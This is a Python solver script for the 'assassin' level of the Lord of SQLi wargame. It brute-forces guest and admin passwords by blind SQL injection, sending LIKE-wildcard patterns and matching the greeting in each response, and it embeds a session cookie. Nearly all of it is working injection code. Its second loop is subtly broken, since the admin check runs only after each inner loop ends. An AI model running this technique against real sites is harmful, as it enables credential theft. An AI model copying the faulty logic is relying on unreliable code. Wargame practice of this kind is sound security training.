import requests
import string

url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies={'PHPSESSID':"llq3pcg2co7cn31b515t28guqh"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"

password=""
print("Find guest pw is ")
for find in ascii_code:
    params="?pw=%{}%".format(find)
    find_url=url+params
    response=requests.get(find_url, cookies=cookies)

    if response.text.find("<h2>Hello guest</h2>")>0:
        password+=find
        print(password)

print("Find guest_password done\n")

url="https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies={'PHPSESSID':"llq3pcg2co7cn31b515t28guqh"}
ascii_code=string.digits+string.ascii_letters
utf="utf-8"
i=0
for find in password:
    for i in password:
        params="?pw=%{}%{}%".format(find, i)
        find_url=url+params
        print(find_url)
        response=requests.get(find_url, cookies=cookies)

    if response.text.find("<h2>Hello admin</h2>")>0:
        print("find! URL -> "+find_url)
'''
게스트와 어드민의 비밀번호의 문자열 구성은 같음
다른 배열의 문자열을 찾는 코드
'''